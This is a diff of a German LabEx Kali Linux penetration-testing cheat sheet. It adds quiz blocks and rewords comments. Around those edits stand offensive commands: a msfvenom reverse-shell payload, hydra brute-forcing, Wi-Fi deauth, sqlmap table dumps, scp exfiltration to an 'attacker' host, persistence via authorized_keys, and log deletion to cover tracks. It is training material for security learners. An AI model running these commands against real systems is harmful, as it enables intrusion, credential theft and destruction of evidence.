@@ -1,6 +1,6 @@
 ---
-title: 'Kali Linux Spickzettel'
-description: 'Lernen Sie Kali Linux mit unserem umfassenden Spickzettel, der wesentliche Befehle, Konzepte und Best Practices abdeckt.'
+title: 'Kali Linux Spickzettel | LabEx'
+description: 'Lernen Sie Kali Linux Penetration Testing mit diesem umfassenden Spickzettel. Schnelle Referenz für Sicherheitstools, Ethical Hacking, Schwachstellen-Scanning, Exploitation und Cybersicherheitstests.'
 pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
 ---
 
@@ -12,10 +12,10 @@ Kali Linux Spickzettel
 
 <base-disclaimer>
 <base-disclaimer-title>
-<a target="_blank" href="https://labex.io/de/learn/kali">Lernen Sie Kali Linux Penetration Testing mit Hands-On Labs</a>
+<a target="_blank" href="https://labex.io/de/learn/kali">Lernen Sie Kali Linux mit praktischen Labs</a>
 </base-disclaimer-title>
 <base-disclaimer-content>
-Lernen Sie Kali Linux Penetration Testing durch praktische Labs und reale Szenarien. LabEx bietet umfassende Kali Linux Kurse, die wesentliche Befehle, Netzwerkerkennung, Schwachstellenanalyse, Passwortangriffe, Webanwendungstests und digitale Forensik abdecken. Meistern Sie ethische Hacking-Techniken und Sicherheitsauditing-Tools.
+Lernen Sie Kali Linux Penetration Testing durch praktische Labs und reale Szenarien. LabEx bietet umfassende Kali Linux Kurse, die wesentliche Befehle, Netzwerksuche, Schwachstellenbewertung, Passwortangriffe, Webanwendungstests und digitale Forensik abdecken. Meistern Sie ethische Hacking-Techniken und Sicherheitsauditing-Tools.
 </base-disclaimer-content>
 </base-disclaimer>
 
@@ -23,16 +23,16 @@ Lernen Sie Kali Linux Penetration Testing durch praktische Labs und reale Szenar
 
 ### Ersteinrichtung: `sudo apt update`
 
-Aktualisieren Sie Systempakete und Repositories für optimale Leistung.
+Aktualisieren Sie Systempakete und Repositorys für optimale Leistung.
 
 ```bash
 # Paket-Repository aktualisieren
 sudo apt update
-# Installierte Pakete upgraden
+# Installierte Pakete aktualisieren
 sudo apt upgrade
 # Vollständiges System-Upgrade
 sudo apt full-upgrade
-# Essentielle Tools installieren
+# Wesentliche Tools installieren
 sudo apt install curl wget git
 ```
 
@@ -83,7 +83,7 @@ sudo ifconfig wlan0 up
 
 ### Umgebungsvariablen: `export`
 
-Richten Sie Umgebungsvariablen und Pfade für Tests ein.
+Richten Sie Testumgebungsvariablen und Pfade ein.
 
 ```bash
 # Ziel-IP festlegen
@@ -93,6 +93,21 @@ export WORDLIST=/usr/share/wordlists/rockyou.txt
 # Umgebungsvariablen anzeigen
 env | grep TARGET
 ```
+
+<BaseQuiz id="kali-env-1" correct="C">
+  <template #question>
+    Was passiert mit Umgebungsvariablen, die mit `export` gesetzt werden?
+  </template>
+  
+  <BaseQuizOption value="A">Sie bleiben über Systemneustarts hinaus bestehen</BaseQuizOption>
+  <BaseQuizOption value="B">Sie sind nur in der aktuellen Datei verfügbar</BaseQuizOption>
+  <BaseQuizOption value="C" correct>Sie sind für die aktuelle Shell und Kindprozesse verfügbar</BaseQuizOption>
+  <BaseQuizOption value="D">Sie sind globale Systemvariablen</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    Umgebungsvariablen, die mit `export` gesetzt werden, sind für die aktuelle Shell-Sitzung und alle daraus erzeugten Kindprozesse verfügbar. Sie gehen verloren, wenn die Shell-Sitzung beendet wird, es sei denn, sie werden in Shell-Konfigurationsdateien wie `.bashrc` hinzugefügt.
+  </BaseQuizAnswer>
+</BaseQuiz>
 
 ### Tool-Installation: `apt install`
 
@@ -111,7 +126,7 @@ pip3 install --user tool-name
 
 ### Host-Erkennung: `nmap -sn`
 
-Identifizieren Sie aktive Hosts im Netzwerk mittels Ping-Sweeps.
+Identifizieren Sie aktive Hosts im Netzwerk mithilfe von Ping-Sweeps.
 
 ```bash
 # Ping-Sweep
@@ -129,25 +144,56 @@ masscan --ping 192.168.1.0/24
 Scannen Sie nach offenen Ports und laufenden Diensten auf Zielsystemen.
 
 ```bash
-# Basis TCP-Scan
+# Basis-TCP-Scan
 nmap 192.168.1.1
 # Aggressiver Scan
 nmap -A 192.168.1.1
 # UDP-Scan
 nmap -sU 192.168.1.1
-# Stealth SYN-Scan
+# Stealth-SYN-Scan
 nmap -sS 192.168.1.1
 ```
 
+<BaseQuiz id="kali-nmap-1" correct="B">
+  <template #question>
+    Was bewirkt `nmap -sS`?
+  </template>
+  
+  <BaseQuizOption value="A">Führt einen UDP-Scan durch</BaseQuizOption>
+  <BaseQuizOption value="B" correct>Führt einen Stealth-SYN-Scan durch (Halb-offener Scan)</BaseQuizOption>
+  <BaseQuizOption value="C">Scannt alle Ports</BaseQuizOption>
+  <BaseQuizOption value="D">Führt eine Betriebssystemerkennung durch</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    Das Flag `-sS` führt einen SYN-Scan durch (auch Halb-offener Scan genannt), da es den TCP-Handshake niemals abschließt. Es sendet SYN-Pakete und analysiert Antworten, was es heimlicher macht als einen vollständigen TCP-Connect-Scan.
+  </BaseQuizAnswer>
+</BaseQuiz>
+
 ### Dienst-Enumeration: `nmap -sV`
 
-Ermitteln Sie Dienstversionen und potenzielle Schwachstellen.
+Identifizieren Sie Dienstversionen und potenzielle Schwachstellen.
 
 ```bash
 # Versionserkennung
 nmap -sV 192.168.1.1
 # OS-Erkennung
 nmap -O 192.168.1.1
+```
+
+<BaseQuiz id="kali-enumeration-1" correct="A">
+  <template #question>
+    Was bewirkt `nmap -sV`?
+  </template>
+  
+  <BaseQuizOption value="A" correct>Erkennt laufende Dienstversionen auf offenen Ports</BaseQuizOption>
+  <BaseQuizOption value="B">Scannt nur Versionskontroll-Ports</BaseQuizOption>
+  <BaseQuizOption value="C">Zeigt nur anfällige Dienste an</BaseQuizOption>
+  <BaseQuizOption value="D">Führt nur die Betriebssystemerkennung durch</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    Das Flag `-sV` aktiviert die Versionserkennung, die offene Ports abfragt, um festzustellen, welcher Dienst und welche Version läuft. Dies ist nützlich, um potenzielle Schwachstellen zu identifizieren, die mit bestimmten Softwareversionen verbunden sind.
+  </BaseQuizAnswer>
+</BaseQuiz>
 # Skript-Scanning
 nmap -sC 192.168.1.1
 # Umfassender Scan
@@ -161,9 +207,9 @@ nmap -sS -sV -O -A 192.168.1.1
 Sammeln Sie DNS-Informationen und führen Sie Zonentransfers durch.
 
 ```bash
-# Basis DNS-Abfrage
+# Basis-DNS-Abfrage
 dig example.com
-# Reverse DNS-Abfrage
+# Reverse-DNS-Abfrage
 dig -x 192.168.1.1
 # Zonentransfer-Versuch
 dig @ns1.example.com example.com axfr
@@ -247,7 +293,7 @@ Identifizieren Sie Sicherheitslücken mithilfe automatisierter Scanner.
 ```bash
 # Nessus-Dienst starten
 sudo systemctl start nessusd
-# OpenVAS-Scan
+# OpenVAS-Scan starten
 openvas-start
 # Nikto Web-Schwachstellenscanner
 nikto -h http://192.168.1.1
@@ -270,9 +316,9 @@ use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 192.168.1.1
 ```
 
-### Buffer Overflow Tests: `pattern_create`
+### Buffer Overflow-Tests: `pattern_create`
 
-Generieren Sie Muster für Buffer-Overflow-Exploitation.
+Generieren Sie Muster für Buffer Overflow-Ausnutzungen.
 
 ```bash
 # Muster erstellen
@@ -281,9 +327,9 @@ pattern_create.rb -l 400
 pattern_offset.rb -l 400 -q EIP_value
 ```
 
-### Entwicklung benutzerdefinierter Exploits: `msfvenom`
+### Benutzerdefinierte Exploit-Entwicklung: `msfvenom`
 
-Erstellen Sie benutzerdefinierte Payloads für spezifische Ziele.
+Erstellen Sie benutzerdefinierte Payloads für bestimmte Ziele.
 
 ```bash
 # Shellcode generieren
@@ -301,11 +347,11 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > 
 Führen Sie Login-Brute-Force-Angriffe gegen verschiedene Dienste durch.
 
 ```bash
-# SSH Brute-Force
+# SSH-Brute-Force
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
 # HTTP-Formular-Brute-Force
 hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USER^&password=^PASS^:Invalid"
-# FTP Brute-Force
+# FTP-Brute-Force
 hydra -L users.txt -P passwords.txt ftp://192.168.1.1
 ```
 
@@ -314,9 +360,9 @@ hydra -L users.txt -P passwords.txt ftp://192.168.1.1
 Knacken Sie Passwort-Hashes mithilfe von GPU-Beschleunigung.
 
 ```bash
-# MD5 Hash-Knacken
+# MD5-Hash-Knacken
 hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
-# NTLM Hash-Knacken
+# NTLM-Hash-Knacken
 hashcat -m 1000 -a 0 ntlm.hash wordlist.txt
 # Wordlist-Variationen generieren
 hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
@@ -342,7 +388,7 @@ john --rules --wordlist=passwords.txt shadow.txt
 Erstellen Sie benutzerdefinierte Wordlists für gezielte Angriffe.
 
 ```bash
-# 4-8 Zeichen Wordlist generieren
+# 4-8 Zeichen lange Wordlist generieren
 crunch 4 8 -o wordlist.txt
 # Benutzerdefiniertes Zeichensatzmuster
 crunch 6 6 -t admin@ -o passwords.txt
@@ -350,7 +396,7 @@ crunch 6 6 -t admin@ -o passwords.txt
 crunch 8 8 -t @@@@%%%% -o mixed.txt
 ```
 
-## Tests zur Sicherheit Drahtloser Netzwerke
+## Tests zur Sicherheit drahtloser Netzwerke
 
 ### Monitor-Modus-Setup: `airmon-ng`
 
@@ -372,7 +418,7 @@ Entdecken und überwachen Sie drahtlose Netzwerke und Clients.
 ```bash
 # Alle Netzwerke scannen
 sudo airodump-ng wlan0mon
-# Spezifisches Netzwerk anvisieren
+# Auf spezifisches Netzwerk abzielen
 sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
 # Nur WEP-Netzwerke anzeigen
 sudo airodump-ng --encrypt WEP wlan0mon
@@ -385,13 +431,13 @@ Führen Sie Angriffe gegen WPA/WPA2-verschlüsselte Netzwerke durch.
 ```bash
 # Deauth-Angriff
 sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
-# Handshake knacken
+# Erfassten Handshake knacken
 aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
 # WPS-Angriff mit Reaver
 reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
 ```
 
-### Evil Twin Angriff: `hostapd`
+### Evil Twin-Angriff: `hostapd`
 
 Erstellen Sie betrügerische Zugangspunkte zur Ernte von Anmeldeinformationen.
 
@@ -408,10 +454,10 @@ ettercap -T -M arp:remote /192.168.1.0/24//
 
 ### SQL-Injection-Tests: `sqlmap`
 
-Automatisierte Erkennung und Ausnutzung von SQL-Injection-Schwachstellen.
+Automatisierte Erkennung und Ausnutzung von SQL-Injection.
 
 ```bash
-# Basis SQL-Injection-Test
+# Basis-SQL-Injection-Test
 sqlmap -u "http://example.com/page.php?id=1"
 # POST-Parameter testen
 sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
@@ -423,7 +469,7 @@ sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
 
 ### Cross-Site Scripting: `xsser`
 
-Testen Sie auf XSS-Schwachstellen in Webanwendungen.
+Testen Sie Webanwendungen auf XSS-Schwachstellen.
 
 ```bash
 # XSS-Test
@@ -434,7 +480,7 @@ xsser -u "http://example.com" --crawl=10
 xsser --url "http://example.com" --payload="<script>alert(1)</script>"
 ```
 
-### Burp Suite Integration: `burpsuite`
+### Burp Suite-Integration: `burpsuite`
 
 Umfassende Testplattform für die Sicherheit von Webanwendungen.
 
@@ -444,12 +490,12 @@ burpsuite
 # Proxy konfigurieren (127.0.0.1:8080)
 # Browser-Proxy einstellen, um den Verkehr zu erfassen
 # Intruder für automatisierte Angriffe verwenden
-# Spider für die Inhaltserkennung
+# Spider zur Inhaltserkennung
 ```
 
-### Verzeichnis-Traversal: `wfuzz`
+### Directory Traversal: `wfuzz`
 
-Testen Sie auf Schwachstellen bei Verzeichnis-Traversal und File Inclusion.
+Testen Sie auf Schwachstellen bei Verzeichniskreuzungen und Dateieinbindung.
 
 ```bash
 # Verzeichnis-Fuzzing
@@ -462,7 +508,7 @@ wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
 
 ### System-Enumeration: `linpeas`
 
-Automatisierte Enumeration zur Rechteausweitung unter Linux.
+Automatisierte Enumeration zur Rechteausweitung für Linux-Systeme.
 
 ```bash
 # LinPEAS herunterladen
@@ -476,7 +522,7 @@ chmod +x linpeas.sh
 
 ### Persistenzmechanismen: `crontab`
 
-Etablieren Sie Persistenz auf kompromittierten Systemen.
+Stellen Sie Persistenz auf kompromittierten Systemen her.
 
 ```bash
 # Crontab bearbeiten
@@ -487,7 +533,7 @@ crontab -e
 echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
 ```
 
-### Datendiebstahl (Exfiltration): `scp`
+### Datendiebstahl: `scp`
 
 Übertragen Sie Daten sicher von kompromittierten Systemen.
 
@@ -497,7 +543,7 @@ scp file.txt user@192.168.1.100:/tmp/
 # Komprimieren und übertragen
 tar -czf data.tar.gz /home/user/documents
 scp data.tar.gz attacker@192.168.1.100:/tmp/
-# HTTP-Exfiltration
+# HTTP-Diebstahl
 python3 -m http.server 8000
 ```
 
@@ -510,7 +556,7 @@ Entfernen Sie Beweise von Aktivitäten auf kompromittierten Systemen.
 history -c
 unset HISTFILE
 # Spezifische Einträge löschen
-history -d line_number
+history -d Zeilennummer
 # Systemprotokolle löschen
 sudo rm /var/log/auth.log*
 ```
@@ -524,20 +570,20 @@ Erstellen Sie forensische Abbilder von Speichergeräten.
 ```bash
 # Festplattenabbild erstellen
 sudo dd if=/dev/sdb of=/tmp/evidence.img bs=4096 conv=noerror,sync
-# Image-Integrität überprüfen
+# Bildintegrität überprüfen
 md5sum /dev/sdb > original.md5
 md5sum /tmp/evidence.img > image.md5
-# Image einbinden
+# Abbild einbinden
 sudo mkdir /mnt/evidence
 sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
 ```
 
 ### Dateiwiederherstellung: `foremost`
 
-Stellen Sie gelöschte Dateien aus Festplatten-Images oder Laufwerken wieder her.
+Stellen Sie gelöschte Dateien aus Festplattenabbildern oder Laufwerken wieder her.
 
 ```bash
-# Dateien aus Image wiederherstellen
+# Dateien aus Abbild wiederherstellen
 foremost -i evidence.img -o recovered/
 # Spezifische Dateitypen
 foremost -t jpg,png,pdf -i evidence.img -o photos/
@@ -565,7 +611,7 @@ Analysieren Sie Netzwerkverkehrsaufzeichnungen auf forensische Beweise.
 ```bash
 # Wireshark starten
 wireshark
-# Kommandozeilenanalyse
+# Befehlszeilenanalyse
 tshark -r capture.pcap -Y "http.request.method==GET"
 # Dateien extrahieren
 foremost -i capture.pcap -o extracted/
@@ -575,7 +621,7 @@ foremost -i capture.pcap -o extracted/
 
 ### Screenshot-Erfassung: `gnome-screenshot`
 
-Dokumentieren Sie Ergebnisse durch systematische Erfassung von Screenshots.
+Dokumentieren Sie Ergebnisse mit systematischer Erfassung von Screenshots.
 
 ```bash
 # Vollbildaufnahme
@@ -593,7 +639,7 @@ gnome-screenshot -a -f area.png
 Zeichnen Sie Terminal-Sitzungen zu Dokumentationszwecken auf.
 
 ```bash
-# Sitzungsaufzeichnung starten
+# Aufnahme der Sitzung starten
 script session.log
 # Mit Zeitstempel aufzeichnen
 script -T session.time session.log
@@ -616,7 +662,7 @@ pandoc report.md -o report.pdf
 
 ### Beweisintegrität: `sha256sum`
 
-Wahren Sie die Beweiskette durch kryptografische Hashes.
+Wahren Sie die Beweiskette mit kryptografischen Hashes.
 
 ```bash
 # Prüfsummen generieren
@@ -631,16 +677,16 @@ find /evidence -type f -exec sha256sum {} \; > all_files.sha256
 
 ### Paketverwaltung: `apt`
 
-Warten und aktualisieren Sie Systempakete und Sicherheitstools.
+Verwalten und aktualisieren Sie Systempakete und Sicherheitstools.
 
 ```bash
 # Paketlisten aktualisieren
 sudo apt update
-# Alle Pakete upgraden
+# Alle Pakete aktualisieren
 sudo apt upgrade
 # Spezifisches Tool installieren
 sudo apt install tool-name
-# Nicht verwendete Pakete entfernen
+# Unbenutzte Pakete entfernen
 sudo apt autoremove
 ```
 
@@ -659,7 +705,7 @@ sudo apt install linux-image-generic
 sudo apt autoremove --purge
 ```
 
-### Tool-Verifizierung: `which`
+### Tool-Überprüfung: `which`
 
 Überprüfen Sie Tool-Installationen und lokalisieren Sie ausführbare Dateien.
 
@@ -694,14 +740,14 @@ netstat -tulnp
 Richten Sie zeitsparende Befehlskürzel für häufige Aufgaben ein.
 
 ```bash
-# bashrc bearbeiten
+# Bashrc bearbeiten
 nano ~/.bashrc
 # Nützliche Aliase hinzufügen
 alias ll='ls -la'
 alias nse='nmap --script-help'
 alias target='export TARGET='
 alias msf='msfconsole -q'
-# bashrc neu laden
+# Bashrc neu laden
 source ~/.bashrc
 ```
 
@@ -714,7 +760,7 @@ Erstellen Sie erweiterte Befehlskombinationen für gängige Workflows.
 function qscan() {
     nmap -sS -sV -O $1
 }
-# Verzeichnisstruktur für Engagements
+# Setup für Engagements
 function pentest-setup() {
     mkdir -p {recon,scans,exploits,loot}
 }
@@ -731,7 +777,7 @@ Meistern Sie wesentliche Tastenkombinationen für schnellere Navigation.
 # Ctrl+L - Bildschirm löschen
 # Ctrl+R - Befehlshistorie durchsuchen
 # Tab - Befehle automatisch vervollständigen
-# Pfeil Hoch/Runter - Befehlshistorie durchlaufen
+# Pfeil nach oben/unten - Befehlshistorie durchsuchen
 ```
 
 ### Umgebungskonfiguration: `tmux`
